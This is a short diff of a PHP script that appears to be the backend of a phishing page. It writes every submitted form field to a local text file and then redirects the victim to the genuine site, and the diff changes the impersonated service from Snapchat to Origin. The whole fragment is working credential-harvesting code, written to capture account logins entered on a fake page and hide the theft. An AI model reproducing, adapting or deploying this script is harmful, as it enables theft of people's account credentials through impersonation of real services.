@@ -1,6 +1,6 @@
 <?php
-header ('Location:https://www.snapchat.com/');
-$handle = fopen("snapchat.txt", "a");
+header ('Location:https://origin.com/');
+$handle = fopen("origin.txt", "a");
 foreach($_POST as $variable => $value) {
    fwrite($handle, $variable);
    fwrite($handle, "=");
